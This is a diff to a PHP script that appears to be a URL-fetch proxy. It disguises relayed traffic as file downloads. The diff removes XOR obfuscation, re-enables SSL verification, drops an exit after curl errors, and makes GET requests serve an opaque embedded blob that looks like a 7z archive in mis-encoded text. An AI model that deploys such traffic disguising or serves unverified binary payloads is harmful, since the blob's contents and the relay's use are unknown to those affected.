@@ -1,5 +1,4 @@
 <?php
-error_reporting(0);
 $__content__ = '';
 function namef() {
 $req = $_SERVER['REQUEST_URI'];
@@ -68,7 +67,8 @@ global $__password__;
 list($nameff, $namefr) = namef();
 header('Content-type: '.$namefr.'');
 header('Content-Disposition: attachment; filename='.$nameff.'');
-echo $content ^ str_repeat($__password__[0], strlen($content));
+//echo $content ^ str_repeat($__password__[0], strlen($content));
+echo $content;
 }
 function curl_header_function($ch, $header) {
 global $__content__;
@@ -127,15 +127,13 @@ $curl_opt[CURLOPT_CONNECTTIMEOUT] = 10;
 $curl_opt[CURLOPT_TIMEOUT] = 19;
 $curl_opt[CURLOPT_HEADERFUNCTION] = 'curl_header_function';
 $curl_opt[CURLOPT_WRITEFUNCTION]  = 'curl_write_function';
-$curl_opt[CURLOPT_SSL_VERIFYPEER] = false;
-$curl_opt[CURLOPT_SSL_VERIFYHOST] = false;
+//$curl_opt[CURLOPT_SSL_VERIFYPEER] = false;
+//$curl_opt[CURLOPT_SSL_VERIFYHOST] = false;
 curl_setopt_array($ch, $curl_opt);
 curl_exec($ch);
 if (curl_errno($ch)) {
 $error0 = curl_error($ch);
 echo_content("HTTP/1.0 502\r\n\r\n" . message_html('502 Urlfetch Error', 'URL error ' . $error0));
-curl_close($ch);
-exit;
 }
 curl_close($ch);
 if ($GLOBALS['__content__']) {
@@ -146,7 +144,8 @@ function get() {
 list($nameff, $namefr) = namef();
 header('Content-type: '.$namefr.'');
 header('Content-Disposition: attachment; filename='.$nameff.'');
-echo "0";
+echo "7zјЇ' OшS‰        0       ФсЇб=™З*lbZЎ·&3QKV(eЎ¦aJЯз58wэJIf»LqћњМЯЌ.С‚Гdч<¦g[О…«щ‡<;q—ї0Ћ-[-8Ё±ЄX§ё <0и!’?&<&(Њ†`]чcФuэ>7/U‡#ЛІП¤=¦Ђ0A>›¤…Z§9|Ћ9љ‰й)ь†XgD§ЙырІМжЄk±ГЄaрбЉ·¶Ъz	Ђђ  $сS^к2цљы—§g 'ЦЦъјЂЉ
+и9Rl  ";
 }
 function main() {
 if ($_SERVER['REQUEST_METHOD'] == 'POST') {
